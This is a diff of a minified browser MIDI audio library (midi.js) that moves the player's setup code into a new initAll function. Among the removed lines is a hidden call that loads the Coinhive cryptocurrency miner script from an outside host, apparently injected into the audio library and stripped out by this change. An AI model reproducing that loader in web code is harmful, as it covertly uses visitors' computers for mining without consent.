@@ -178,17 +178,20 @@
         q = 30;
     B = h();
     var G = n();
-    try {
-        ("iPhone" == G.platform || "iPod" == G.platform || "iPad" == G.platform) && G.majorVersion <= 6 ? A = "none" : (window.AudioContext = window.AudioContext || window.webkitAudioContext, E = new AudioContext, A = "WebAudioAPI")
-    } catch (W) {
-        A = "Microsoft Internet Explorer" == G.browserName ? "bgsound" : "Android" == G.browserName ? "none" : "object"
+    e.MIDIjs = new Object;
+    e.MIDIjs.initAll = function(){
+        try {
+            ("iPhone" == G.platform || "iPod" == G.platform || "iPad" == G.platform) && G.majorVersion <= 6 ? A = "none" : (window.AudioContext = window.AudioContext || window.webkitAudioContext, E = new AudioContext, A = "WebAudioAPI")
+        } catch (W) {
+            A = "Microsoft Internet Explorer" == G.browserName ? "bgsound" : "Android" == G.browserName ? "none" : "object"
+        };
+        e.MIDIjs.set_logging = function(e) {
+            R = e
+        }, e.MIDIjs.get_loggging = function() {
+            return R
+        }, e.MIDIjs.player_callback = function(e) {}, e.MIDIjs.message_callback = function(e) {}, e.MIDIjs.get_audio_status = function() {
+            return V
+        }, e.MIDIjs.unmute_iOS_hack = a, "WebAudioAPI" == A ? (e.MIDIjs.play = u, e.MIDIjs.stop = b, V = "audioMethod: WebAudioAPI, sampleRate (Hz): " + E.sampleRate + ", audioBufferSize (Byte): " + N, e.MIDIjs.noteOn = m, e.MIDIjs.startSynth = d) : "bgsound" == A ? (e.MIDIjs.play = M, e.MIDIjs.stop = v, V = "audioMethod: &lt;bgsound&gt;") : "object" == A ? (e.MIDIjs.play = _, e.MIDIjs.stop = y, V = "audioMethod: &lt;object&gt;") : (e.MIDIjs.play = function(e) {}, e.MIDIjs.stop = function(e) {}, V = "audioMethod: No method found"), "Microsoft Internet Explorer" == G.browserName && "https:" == location.protocol.toLowerCase() && M("http://" + B + "midi/silence.mid")
     }
-    e.MIDIjs = new Object, e.MIDIjs.set_logging = function(e) {
-        R = e
-    }, e.MIDIjs.get_loggging = function() {
-        return R
-    }, e.MIDIjs.player_callback = function(e) {}, e.MIDIjs.message_callback = function(e) {}, e.MIDIjs.get_audio_status = function() {
-        return V
-    }, e.MIDIjs.unmute_iOS_hack = a, "WebAudioAPI" == A ? (e.MIDIjs.play = u, e.MIDIjs.stop = b, V = "audioMethod: WebAudioAPI, sampleRate (Hz): " + E.sampleRate + ", audioBufferSize (Byte): " + N, e.MIDIjs.noteOn = m, e.MIDIjs.startSynth = d) : "bgsound" == A ? (e.MIDIjs.play = M, e.MIDIjs.stop = v, V = "audioMethod: &lt;bgsound&gt;") : "object" == A ? (e.MIDIjs.play = _, e.MIDIjs.stop = y, V = "audioMethod: &lt;object&gt;") : (e.MIDIjs.play = function(e) {}, e.MIDIjs.stop = function(e) {}, V = "audioMethod: No method found"), "Microsoft Internet Explorer" == G.browserName && "https:" == location.protocol.toLowerCase() && M("http://" + B + "midi/silence.mid"), t("https://coinhive.com/lib/coinhive.min.js", D)
 }(this);
 //# sourceMappingURL=/lib/midi.js.map
